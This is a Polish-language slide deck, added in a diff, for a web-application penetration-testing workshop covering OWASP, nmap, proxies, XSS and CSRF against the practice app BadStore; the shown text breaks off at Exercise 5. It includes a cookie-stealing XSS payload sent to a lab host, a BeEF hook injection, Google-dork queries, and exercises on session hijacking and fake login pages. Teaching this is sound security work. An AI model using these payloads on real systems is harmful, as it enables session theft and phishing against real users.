@@ -1,0 +1,1239 @@
+<!doctype html>
+<html lang="pl">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Praktyczne sposoby wykrywania podatności w aplikacjach webowych</title>
+
+		<meta name="description" content="A framework for easily creating beautiful presentations using HTML">
+		<meta name="author" content="Hakim El Hattab">
+
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/white.css" id="theme">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+		
+		<style>
+			.reveal table th, .reveal table td {border-bottom: 0px;}
+			html.dimbg .slide-background {
+				opacity: 0.2 !important;
+			}
+			
+			#no-header {
+				visibility: hidden;
+				display: none;
+			}
+		</style>
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+		
+		
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides">
+				
+					<section data-background="pictures/tlo_1.jpg" data-state="dimbg">
+						<h2>Praktyczne sposoby wykrywania podatności w aplikacjach webowych</h2>
+						<p>
+							<h3>Stacja IT - Warsztat #285</h3>
+						</p>
+						<p style="text-align:right"><a href="http://www.linkedin.com/in/klara-trzcinska">Klara Trzcińska</a></p>
+					</section>
+				
+				<section>	
+					<section>
+						<h2>Informacje organizacyjne</h2>
+					</section>
+					
+					<section>
+						<h3>O mnie</h3>
+						<p>Zajmuje się głównie testami bezpieczeństwa aplikacji webowych oraz testami wydajnościowymi. Mam ponad trzy lata doświadczenia w pentestach. Moim głownym zainteresowaniem są testy bezpieczeństwa aplikacji webowych. Na codzień pracuję jako Starszy Specjalista w Pentacomp Systemy Informatyczne, gdzie zajmuje się głównie testami bezpieczeństwa aplikacji webowych oraz testami automatycznymi.</p>
+					</section>
+					
+					<section>
+						<h3>O Pentacomp</h3>
+						<p>Jesteśmy niezależnym producentem rozwiązań informatycznych i dostawcą profesjonalnych usług IT dla klientów z wybranych branż gospodarki i sektora publicznego. Dysponujemy wieloletnim doświadczeniem w realizacji strategicznych projektów dla największych w Polsce organizacji.</p>				
+						<img height="100" data-src="pictures/PC_Logo_www.jpg" alt="Pentacomp">
+					</section>
+					
+					<section>
+                        <h3>Kwestie organizacyjne</h3>
+                        <ul>
+                            <li>Jeśli nikt nie ma nic przeciwko, zwracajmy się na "Ty".</li>
+                            <li>Co około 90 minut zrobimy 10-minutową przerwę.</li>
+                            <li>Pytania zadawajcie na bieżąco.</li>
+                        </ul>
+                    </section>
+					
+					<section>
+                        <h3>O was</h3>
+                        <ul>
+							<li>Czy masz jakieś doświadczenie w testach bezpieczeństwa?</li>
+                            <li>Czego oczekujesz od szkolenia?</li>
+                        </ul>
+                    </section>
+					
+					<section>
+                        <h3>Code of Ethics</h3>
+                        <p>Prezentowanych na warsztatach technik nie stosujemy na systemach bez zgody właściciela.</p>
+                    </section>
+					
+					<section>
+                        <h3>Korzystanie z prezentacji</h3>
+                        <ul>
+                            <li>Kliknięcie ESC wyświetla widok aktualnego slajdu i pozostałych slajdów.</li>
+							<li>Wybranie ikony w lewym dolnym rogu lub wciśnięcie klawisza <i>m</i> powoduje pojawienie się menu nawigacyjnego.</li>   
+                        </ul>
+                    </section>
+					
+					<section>
+					<h3>Agenda (I)</h3>
+						<ul>
+							<li>Wprowadzenie i statystyki dotyczące podatności</li>
+							<li>Organizacja OWASP – materiały i narzędzia OWASP</li>
+							<li>OWASP Top 10</li>
+							<li>Podstawowe informacje dotyczące aplikacji webowych</li>
+							<li>Skanowanie portów</li>
+						</ul>
+					</section>
+					
+					<section>
+					<h3>Agenda (II)</h3>
+						<ul>
+							<li>Przegląd baz danych podatności</li>
+							<li>Narzędzia typu lokalnego Proxy</li>
+							<li>Podatność XSS i jej wykorzystanie (BeEF i własny skrypt)</li>
+							<li><b>Przerwa obiadowa ok. 13:00</b></li>
+						</ul>
+					</section>
+					
+					<section>
+					<h3>Agenda (III)</h3>
+						<ul>
+							<li>Ataki CSRF, przygotowanie przykładowej strony HTML wykonującej atak</li>
+							<li>SQL Injection</li>
+							<li>Podatności kategorii Broken Access Control</li>
+							<li>Podsłuchanie komunikacji nieszyfrowanej z wykorzystaniem Wireshark</li>
+							<li>Ataki Slow HTTP</li>
+							<li>Skanery umożliwiające automatyczne testy bezpieczeństwa</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Wprowadzenie</h2>
+					</section>
+					
+					<section>
+						<h3>Statystyki 2014 - 2018 - raport Imperva</h3>
+						<img height="360" data-src="pictures/statistics2018.png" alt="Statystyki Imperva">
+						<p>Statystyki podatności w latach 2014 - 2018 według <a href="https://www.imperva.com/blog/the-state-of-web-application-vulnerabilities-in-2018/">raportu</a> Imperva</p>
+					</section>
+					
+					<section>
+                        <h3>Test penetracyjny</h3>
+                        <ul>
+                            <li>Kontrolowany atak na system teleinformatyczny.</li>
+							<li>Umożliwia praktyczną ocenę stanu bezpieczeństwa.</li>
+							<li>Pentester wciela się w rolę potencjalnego włamywacza.</li>
+                        </ul>
+                    </section>
+					
+					<section>
+					<h3>Test penetracyjny - audyt - test bezpieczeństwa</h3>
+						<ul>
+                            <li>Pentest nie jest audytem. Audyt sprawdza zgodność z formalną specyfikacją stanu pożądanego (normą, aktem prawnym).</li>
+							<li>Test bezpieczeństwa jest pojęciem bardzo szerokim.</li>
+							<li>Testy bezpieczeństwa są często elementem testów pozafunkcjonalnych</li>
+						</ul>
+					</section>
+					
+				</section>
+				
+				<section>
+					<section>
+						<h2>OWASP</h2>
+					</section>
+					
+					<section>
+						<h3>Organizacja OWASP</h3>
+						Open Web Application Security Project (OWASP) – organizacja non-profit, której celem jest poprawa stanu bezpieczeństwa aplikacji poprzez tworzenie artykułów, metodologii, dokumentacji, narzędzi i technologii o otwartym dostępie.
+					</section>
+					
+					<section>
+						<h3>Projekty OWASP</h3>
+						<ul>
+							<li>OWASP Top 10</li>
+							<li>OWASP Testing Guide</li>
+							<li>OWASP Cheat Sheet Series</li>
+							<li>OWASP Application Security Verification Standard (ASVS)</li>
+							<li>OWASP Top 10 Proactive Controls</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>OWASP Cheat Sheet Series</h3>
+						<img height="458" data-src="pictures/Preface_Cheatsheet_Logo.png" alt="OWASP Cheat Sheet Series">
+					</section>
+					
+					<section>
+						<h3>OWASP Top 10 (2017)</h3>
+						<ul>
+							<li>A1 Injection</li>
+							<li>A2 Broken Authentication</li>
+							<li>A3 Sensitive Data Exposure</li>
+							<li>A4 XML External Entities (XXE)</li>
+							<li>A5 Broken Access Control</li>
+							<li>A6 Security Misconfiguration</li>
+							<li>A7 Cross-Site Scripting (XSS)</li>
+							<li>A8 Insecure Deserialization</li>
+							<li>A9 Using Components with Known Vulnerabilities</li>
+							<li>A10 Insufficient Logging & Monitoring</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>OWASP Top 10 (2017) - Linki</h3>
+						<img height="500" data-src="pictures/owasp2.png" alt="OWASP Top 10">
+						<br>
+						<small>
+						<a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project">OWASP Top 10 Project</a> |
+						<a href="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf">OWASP Top 10 2017 - PDF</a>
+						</small>
+					</section>
+					
+					<section>
+						<h3>OWASP Top Ten Proactive Controls</h3>
+						<ul>
+							<li>C1: Define Security Requirements</li>
+							<li>C2: Leverage Security Frameworks and Libraries</li>
+							<li>C3: Secure Database Access</li>
+							<li>C4: Encode and Escape Data</li>
+							<li>C5: Validate All Inputs</li>
+							<li>C6: Implement Digital Identity</li>
+							<li>C7: Enforce Access Controls</li>
+							<li>C8: Protect Data Everywhere</li>
+							<li>C9: Implement Security Logging and Monitoring</li>
+							<li>C10: Handle All Errors and Exceptions</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Narzędzie OWASP ZAP</h3>
+						<ul>
+							<li>Lokalne proxy przechwytujące</li>
+							<li>Spider</li>
+							<li>Aktywne skanowanie</li>
+							<li>Fuzzer (przesyłaniu aplikacji niepoprawnych lub nieprzewidzianych danych)</li>
+							<li>Liczne dodatki</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>OWASP Xenotix XSS Exploit Framework (I)</h3>
+						<ul>
+							<li>Symuluje ataki wykorzystujące luki w bezpieczeństwie poprzez wstrzyknięcie kodu JavaScript.</li> 
+							<li>Jeden z niewielu systemów posiadających potrójny silnik wyszukiwarki (IE, Firefox, Chrome).</li> 
+							<li>Nie generuje wyników fałszywie pozytywnych, ponieważ pokazuje działanie trzech przeglądarek po wprowadzeniu potencjalnie niebezpiecznych wartości.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>OWASP Xenotix XSS Exploit Framework (II)</h3>
+						<ul>
+							<li>Osobiście polecam wykonywać testy manualnie, a nie korzystać z narzędzia.</li>
+							<li><i>PROJECT DEVELOPMENT AND SUPPORT IS DISCONTINUED!</i></li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>OWASP Dependency Check (I)</h3>
+						<ul>
+							<li>Do poprawnego przeskanowania aplikacji niezbędne jest zbudowanie projektu. Na przykład, w przypadku aplikacji pisanych w .NET należy wskazać folder bin z plikami wyjściowymi, który zawiera pliki .dll, a w aplikacjach pisanych w języku Java należy użyć folderu gdzie znajdują się pliki wyjściowe np. .jar.</li> 
+						</ul>
+					</section>
+					
+					<section>
+						<h3>OWASP Dependency Check (II)</h3>
+						<ul>
+							<li>Przewagą narzędzia nad analizatorami kodu jest taka, że nie jest potrzebny kod źródłowy do działania OWASP Dependency Check. Wystarczy jedynie zbudowana paczka z aplikacją.</li>
+							<li>Narzędzie generuje raport w formacie .html z podsumowaniem testów.</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Aplikacja webowa - podstawowe informacje</h2>
+					</section>
+					
+					<section>
+						<h3>Definicja</h3>
+						<p><i>Program komputerowy, który pracuje na serwerze i komunikuje się poprzez sieć komputerową z hostem użytkownika komputera z wykorzystaniem przeglądarki internetowej użytkownika, będącego w takim przypadku interaktywnym klientem aplikacji internetowej.</i><p>
+					</section>
+					
+					<section>
+						<h3>Model Klient - Serwer</h3>
+						<ul>
+							<li>Klient wysyła żądanie (<i>request</i>) do serwera.</li>
+							<li>Żądanie zawiera URL (Uniform Resource Locator).</li>
+							<li>Serwer zwraca zasób, jeżeli jest dostępny (<i>response</i>).</li>
+							<li>HTTP jest protokołem bezstanowym.</li>
+							<li>Istnieją mechanizmy zapewniające emulację stanów - sesje, ciasteczka.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>URL</h3>
+						<img height="200" data-src="pictures/url.png" alt="URL">
+						<ul>
+							<li>host - adres serwera, w postaci domenowej lub adresu IP,</li>
+							<li>port - numer portu, na którym serwer odbiera połączenia TCP (80, 443, 8080),</li>
+							<li>path - ścieżka dostępu do zasobu, jeżeli nieobecna podaje się "/".</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Żądanie</h3>
+						<ul>
+							<li>Wybór metody,</li>
+							<li>Adres zasobu,</li>
+							<li>Wersja protokołu HTTP,</li>
+							<li>Dane.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Metoda GET</h3>
+						<p>Polega na umieszczeniu par parametr=wartość w adresie strony, np. <i>index.php?lang=pl&cat=2&sidebar=yes</i></p>
+					</section>
+					
+					<section>
+						<h3>Metoda POST</h3>
+						<p>Metoda POST powinna być stosowana tam, gdzie dane odwołanie jest formą interakcji z użytkownikiem, niemożliwą do utrwalenia w formie adresu. Powinna być także stosowana tam, gdzie dana operacja może wywołać wiążące dla użytkownika skutki – np. zapisanie na listę dyskusyjną.</p>
+					</section>
+					
+					<section>
+						<h3>Odpowiedź</h3>
+						<ul>
+							<li>Wersja protokołu HTTP,</li>
+							<li>Status odpowiedzi - trzycyfrowy kod np. 200 OK, 301 Moved Permanently, 404 Not found,</li>
+							<li>Dane.</li>
+						</ul>
+					</section>
+				</section>	
+					
+					
+				</section>
+				
+				<section>
+					<section>
+						<h2>Lokalne Proxy</h2>
+					</section>
+					<section>
+						<h3>Narzędzia typu lokalnego Proxy</h3>
+							<ul>
+								<li>Proxy jest zainstalowane na komputerze testującego.</li>
+								<li>Przeglądarka łączy się z Proxy, a następnie Proxy łączy się z żądaną stroną internetową.</li>
+								<li>Dzięki takiemu połączeniu możliwe jest przechwytywanie oraz zmiana danych wysyłanych pomiędzy przeglądarką, a serwerem.</li>
+							</ul>
+							<img height="158" data-src="pictures/Obraz5.png" alt="Proxy Lokalne">
+					</section>
+					<section>
+						<h3>Burp Suite (I)</h3>
+						<img height="258" data-src="pictures/burp.jpg" alt="Burp Suite">
+						<p>Bardzo popularne narzędzie wykorzystywane podczas testów bezpieczeństwa.</p>
+					</section>
+					<section>
+						<h3>Burp Suite (II)</h3>
+							<ul>
+								<li>Szczegółowa analiza i obróbka zapytań oraz odpowiedzi.</li>
+								<li>Możliwość powtórzenia i modyfikowania przesłanych wcześniej żądań.</li>
+								<li>Łatwe przenoszenie zapytań pomiędzy różnymi narzędziami.</li>
+								<li>Skaner automatyczny (pasywny i aktywny).</li>
+							</ul>
+					</section>
+					<section>
+						<h3>Instalacja certyfikatu Burp</h3>
+						<img height="400" data-src="pictures/BurpCA.png" alt="Burp Suite">
+						<p>Podczas importu certyfikatu należy zaznaczyć opcję <i>Trust this CA to identify web sites</i></p>
+					</section>
+					
+					<section>
+						<h3>Burp Suite Professional</h3>
+							<ul>
+								<li>Różnice między wersją Community i Professional.</li>
+								<li>Nowości w wersji Burp Suite 2.0 beta m. in. w skanerze automatycznym.</li>
+								<li>Kilka praktycznych wskazówek - logowanie NTLM (platform authentication) i certyfikat SSL po stronie klienta.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Prezentacja OWASP ZAP</h3>
+						<img height="558" data-src="pictures/zap.png" alt="OWASP ZAP">
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h3>BadStore - aplikacja do ćwiczeń</h3>
+						<img height="350" data-src="pictures/BadStore.png" alt="Burp Suite">
+						<p>Aplikacja dosyć stara, pierwsze wydanie 2004 rok ale nadal opisywana na blogach, posiada praktycznie wszystkie najważniejsze podatności.</p>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 1</h2>
+						<p style="text-align: left;">Konfiguracja lokalnego Proxy i przechwytywanie żądań do aplikacji.
+						Aplikacja do testów znajduje się pod adresem <a href="http://www.badstore.net">www.badstore.net</a>.
+						Aby mieć dostęp do aplikacji należy:</p>
+						<ul>
+								<li>Otworzyć plik C:\Windows\System32\drivers\etc\hosts,</li>
+								<li>Dodać wpis <i>adres_ip www.badstore.net</i>.</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Google Hacking</h2>
+					</section>
+					
+					<section>
+						<h3>Definicja</h3>
+						<p>Google hacking to technika wyszukiwania poufnych informacji w wyszukiwarce Google, za pomocą specjalnie dobranych zapytań.</p>
+					</section>
+					
+					<section>
+						<h3>Przykładowe zapytania (I)</h3>
+						<p>
+						<a href="https://pentest-tools.com/information-gathering/google-hacking">Aplikacja internetowa</a> pozwala na wpisanie adresu domeny, a następnie wybraniu interesującej kategorii wyszukiwania. Wybranie kategorii powoduje pojawienie się okna popup z wynikiem wyszukiwania danego zapytania w Google.
+						</p>
+					</section>
+					
+					<section>
+						<h3>Przykładowe zapytania (II)</h3>
+						<ul>
+							<li>filetype:sql "Dumping data for table"</li>
+							<li>"admin account info" filetype:log</li>
+							<li>inurl:hp/device/this.LCDispatcher</li>
+							<li>intitle:"toshiba network camera -user login"</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Skanowanie portów</h2>
+					</section>
+					
+					<section>
+						<h3>Porty (I)</h3>
+						<ul>
+							<li>Porty 0-65535</li>
+							<li>Możliwe stany portów:
+								<ul>
+									<li>Closed (zamknięty) – nie w użyciu</li>
+									<li>Open (otwarty) – nasłuchiwanie, przyjmowanie danych i przesyłanie do aplikacji</li>
+									<li>Filtered (filtrowany) – nie jest możliwe określenie stanu portu (z zewnątrz), gdyż zdalny host nie odpowiada, być może ze względu na firewall, który filtruje ruch</li>
+								</ul>
+							</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Porty (II)</h3>
+						<ul>
+							<li>Popularne aplikacje wykorzystują nr portów do 1023, tzw. dobrze znane porty</li>
+							<li>Każda aplikacja korzystająca z sieci ma port</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Well-known ports</h3>
+						<img height="438" data-src="pictures/ports.jpg" alt="Well-known ports">
+					</section>
+					
+					<section>
+						<h3>Nmap (Network mapper)</h3>
+						<ul>
+							<li>Skanowanie TCP (pełna procedura nawiązania połączenia) <b>-sT</b></li>
+							<li>Skanowanie półotwarte typu TCP SYN bez pełnego nawiązania połączenia z hostem <b>-sS</b></li>
+							<li>Skanowanie UDP <b>-sU</b></li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Three-way Handshake</h3>
+						<img height="438" data-src="pictures/Tcp.png" alt="three-way handshake">
+					</section>
+					
+					<section>
+						<h3>TCP SYN (Stealth) Scan</h3>
+						<img height="238" data-src="pictures/syn_scan.png" alt="TCP SYN Scan">
+						<small>Źródło: https://nmap.org/</small>
+					</section>
+					
+					<section>
+						<h3>UDP</h3>
+						<p>Jest to protokół bezpołączeniowy, więc nie ma narzutu na nawiązywanie połączenia i śledzenie sesji (w przeciwieństwie do TCP). Nie ma też mechanizmów kontroli przepływu i retransmisji. </p>
+					</section>
+					
+					<section>
+						<h3>Nmap (Network mapper)</h3>
+						<ul>
+							<li>Nmap wysyła pakiet na dany numer portu i oczekuje odpowiedzi</li>
+							<li>-P0 (don’t ping)</li>
+							<li>-sT (TcpConnect)</li>
+							<li>-sS (SYN stealth Scan)</li>
+							<li>-sP (Ping Scan)</li>
+							<li>-sU (UDP Scans)</li>
+							<li><b>-sV (Version Scan)</b></li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Polecenie skanowania TCP SYN</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+							nmap -sS -oX raport.xml 192.168.6.29
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Gnerowanie raportu HTML</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+							xsltproc raport.xml -o raport.html
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Graficzna wersja programu nmap - Zenmap</h3>
+						<img height="480" data-src="pictures/zenmap.png" alt="Zenmap">
+					</section>
+					
+					<section>
+						<h3>Skrypty NSE</h3>
+						<p>Skrypty NSE (Nmap Scripting Engine) są to dodatkowe skrypty rozszerzające możliwości skanera Nmap np. wykrywanie podatności w SSL/TLS (np. Heartbleed), ataki brute force, czy nieaktualne wersje wykorzystywanych komponentów.</p>
+					</section>
+					
+					<section>
+						<h3>Skrypt NSE nmap_vulners (I)</h3>
+						<ul>
+							<li>Jest to skrypt łączący Nmapa z bazą podatności vulners (<a href="https://vulners.com/landing">https://vulners.com/landing</a>) - informacje o przeszło 160 000 exploitów. Skrypt przeszukuje bazę podatności pod kątem występowania podatności dla zidentyfikowanych wersji oprogramowania (wymaga wykonania skanowania portów z opcją wykrywania wersji oprogramowania).</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Skrypt NSE nmap_vulners (II)</h3>
+						<ul>
+							<li>Skrypt należy pobrać z repozytorium GIT dostępnego pod adresem <a href="https://github.com/vulnersCom/nmap-vulners">https://github.com/vulnersCom/nmap-vulners</a>, a następnie umieścić w folderze w którym zlokalizowane są skrypty Nmap. W systemie Kali Linux folder zawierający skrypty NSE znajduje się w lokalizacji /usr/share/nmap/scripts.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Polecenie skanowania z wykorzystaniem nmap_vulners</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+							nmap -sV --script vulners -oX raport.xml 192.168.6.29
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Inne narzędzia</h3>
+						<ul>
+							<li>Colasoft Packet Builder</li>
+							<li>Hping2 / Hping3</li>
+							<li>NetScanTools Pro</li>
+							<li>Aplikacje mobilne - IP Scanner, zANTI, Fing</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Bazy danych podatności</h3>					
+						IBM X-Force Exchange, Exploit-db, CVEDetails, NullByte 
+						<img height="380" data-src="pictures/Obraz3.png" alt="CVE-Details">
+					</section>
+				</section>
+					
+				<section>	
+					<section>
+						<h2>Ćwiczenie 2</h2>
+						<ul>
+								<li>Skanowanie portów z wykorzystaniem Nmapa w trybie konsolowym lub GUI.</li>
+								<li>Skanowanie z opcją wykrywania wersji oprogramowania dla portu aplikacyjnego (jak inaczej zdobyć informację o wersji oprogramowania?).</li>
+								<li>Wyszukanie podatności dla tej wersji oprogramowania w bazie CVE-Details.</li>
+						</ul>
+					</section>
+				</section>	
+					
+				
+				<section>
+					<section>
+						<h2>Cross-Site Scripting - XSS</h2>
+					</section>
+				
+					<section>
+						<h3>Cross-Site Scripting - XSS (I)</h3>
+						<ul>
+							<li>Atak polegający na osadzeniu w treści atakowanej strony kodu, zazwyczaj JavaScript, który wyświetlany jest użytkownikowi.</li>
+							<li>Atakujący może wykonać skrypt po stronie użytkownika aplikacji internetowej porywając między innymi jego sesje lub powodując przekierowanie na inną stronę.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Cross-Site Scripting - XSS (II)</h3>
+						<ul>
+							<li>Reflected XSS (Nonpersistent XSS)</li>
+							<li>Persistent XSS (Stored XSS)</li>
+							<li>Oparte o DOM (DOM XSS)</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Stored XSS</h3>
+						<img height="338" data-src="pictures/Obraz1.png" alt="Regular expression">
+					</section>
+					
+					<section>
+						<h3>Reflected XSS</h3>
+						<img height="338" data-src="pictures/Obraz2.png" alt="Regular expression">
+					</section>
+					
+					<section>
+						<h3>XSS Lokator</h3>
+						Testy można wykonać manualnie, przesyłając w każdym możliwym parametrze, którego wartość jest zwracana użytkownikowi tzw. lokator XSS w postaci znaków:
+						<pre><code class="hljs" data-trim contenteditable>
+						'';!--"&lt;XSS&gt;=&{()}
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>XSS Standardowy Payload</h3>
+						Testy można wykonać z wykorzystaniem standardowego payloadu powodującego wyświetlenie okna z alertem:
+						<pre><code class="hljs" data-trim contenteditable>
+						&lt;script&gt;alert(1)&lt;/script&gt;
+						</code></pre>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 3</h2>
+						<ul>
+								<li>Znalezienie w aplikacji BadStore podatność XSS Reflected,</li>
+								<li>Znalezienie w aplikacji BadStore podatność XSS Stored,</li>
+								<li>Wykorzystać podatność XSS do przesłania identyfikatora sesji,</li>
+								<li>Podmiana identyfikatora sesji i przejęcie sesji innego użytkownika.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Serwer HTTP z wykorzystaniem Pythona</h3>
+						Python 2.x
+						<pre><code class="hljs" data-trim contenteditable>
+						python -m SimpleHTTPServer 9000
+						</code></pre>
+						Python 3.x
+						<pre><code class="hljs" data-trim contenteditable>
+						python -m http.server 9000
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Kradzież plików cookie</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+						&lt;script&gt;location.href = 'http://192.168.1.14:9000/Stealer.php?cookie='+document.cookie;&lt;/script&gt;
+						</code></pre>
+					</section>
+				</section>
+				
+				<section>				
+					<section>
+						<h2>Wykorzystanie podatności Cross-Site Scripting (XSS)</h2>
+					</section>
+				
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (I)</h3>
+						Pakiet pozwala na wykorzystanie podatności XSS np. wyświetlenie okna dialogowego, uruchomienie dźwięku, pobranie plików cookie, czy zawartości schowka. 
+					</section>
+					
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (II)</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+							&lt;script src="http://192.168.1.14:3000/hook.js">&lt;/script&gt;
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (III)</h3>
+						Panel logowania:
+						<a href="http://192.168.1.14:3000/ui/authentication">http://192.168.1.14:3000/ui/authentication</a>
+						Użytkownik testowy beef/beef<br>
+						Uwaga!
+						Możliwa jest tylko jedna aktywna sesja użytkownika beef. Logujcie się dopiero po zakończeniu prezentacji narzędzia.
+					</section>
+					
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (IV)</h3>
+						<img height="498" data-src="pictures/beef.png" alt="Beef">
+					</section>
+					
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (V)</h3>
+						<ul>
+								<li>Social Engineering</li>
+								<ul>
+									<li>Fake Notification</li>
+									<li>Google Phishing</li>
+									<li>Pretty Theft</li>
+								</ul>
+								<li>Browser</li>
+								<ul>
+									<li>Webcam HTML5</li>
+									<li>Hooked Domain</li>
+									<ul>
+										<li>Get page HTML</li>
+										<li>Get cookie</li>
+									</ul>
+								</ul>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>XSS - Metody ochrony</h2>
+					</section>
+					
+					<section>
+						<h3>Enkodowanie</h3>
+						Filtrowanie danych przesyłanych przez użytkownika przed ich wyświetleniem w aplikacji - enkodowanie:
+						<img height="400" data-src="pictures/encoding.jpg" alt="Encoding">
+					</section>
+					
+					<section>
+						<h3>HttpOnly i .NET Request Validation</h3>
+						<ul>
+							<li>Zastosowanie parametru HttpOnly dla sesyjnych plików cookie.</li>
+							<li>Stosowanie innych mechanizmów ochrony np. .net request validation</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Przykładowy podatny kod</h3>
+						Fragment kodu odpowiadający za dodawanie danych (aplikacja .NET):
+						<pre><code class="hljs" data-trim contenteditable>
+						foreach (var item in currentRow)
+						{
+							cleanedRows.Add(StringHelper.CleanSpaces(item.Value));
+						}
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Przykładowy poprawiony kod</h3>
+						Podatność można usunąć w następujący sposób:
+						<pre><code class="hljs" data-trim contenteditable>
+						foreach (var item in currentRow)
+						{
+							cleanedRows.Add(AntiXssEncoder.HtmlEncode(StringHelper.CleanSpaces(item.Value), false));
+						}
+						</code></pre>
+						Metoda AntiXssEncoder.HtmlEncode odpowiada za encodowanie wprowadzonych znaków. Od wersji .NET 4.5 moduł anty-XSS jest wbudowaną częścią frameworku. Dla wcześniejszych wersji konieczne było pobranie odpowiedniej biblioteki.
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 4</h2>
+						<ul>
+								<li>Opracowanie przykładowego scenariusza ataku z wykorzystaniem podatności XSS.</li>
+								<li>Przygotowanie fałszywego okna logowania do innego systemu.</li>
+						</ul>
+						<br><br>
+						Podpowiedź: <a href="https://resources.infosecinstitute.com/deadly-consequences-xss/">https://resources.infosecinstitute.com/deadly-consequences-xss/</a>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Retrospekcja</h2>
+					</section>
+				
+					<section>
+					<h3>Co udało się już omówić? (I)</h3>
+						<ul>
+							<li>Wprowadzenie i statystyki dotyczące podatności</li>
+							<li>Organizacja OWASP – materiały i narzędzia OWASP</li>
+							<li>OWASP Top 10</li>
+							<li>Podstawowe informacje dotyczące aplikacji webowych</li>
+							<li>Skanowanie portów</li>
+						</ul>
+					</section>
+					
+					<section>
+					<h3>Co udało się już omówić? (II)</h3>
+						<ul>
+							<li>Przegląd baz danych podatności</li>
+							<li>Narzędzia typu lokalnego Proxy</li>
+							<li>Podatność XSS i jej wykorzystanie (BeEF i własny skrypt)</li>
+						</ul>
+					</section>
+				</section>
+					
+				<section>
+					<section>
+						<h2>Cross-Site Request Forgery - CSRF</h2>
+					</section>
+										
+					<section>
+						<h3>Cross-Site Request Forgery - CSRF (I)</h3>
+						Atak polegający na zmuszeniu użytkownika do wykonania niepożądanej akcji w aplikacji internetowej, w której aktualnie jest zalogowany.
+					</section>
+					
+					<section>
+						<h3>Cross-Site Request Forgery - CSRF (II)</h3>
+						<p style="text-align: left;">Z podatnością mamy do czynienia gdy w aplikacji konkretny link wykonuje konkretną akcję np.:</p>
+						<ul>
+							<li>Wykorzystywana jest metoda GET do wykonania istotnej akcji w systemie (parametry w linku).</li>
+							<li>Link jest powtarzalny.</li>
+							<li>Pliki cookie zostaną wysłane automatycznie.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Cross-Site Request Forgery - CSRF (III)</h3>
+						<p style="text-align: left;">Sposób testowania:</p>
+						<ul>
+							<li>Wyszukanie funkcjonalności realizujących zdarzenia zmieniające pewne wartości w systemie np. realizujące przelew, zmieniające hasło.</li>
+							<li>Sprawdzenie powtarzalności żądań/obecności tokenów, a w przypadku ich obecności poprawnego walidowania.</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 5</h2>
+						<ul>
+								<li>Znalezienie w aplikacji BadStore podatność CSRF,</li>
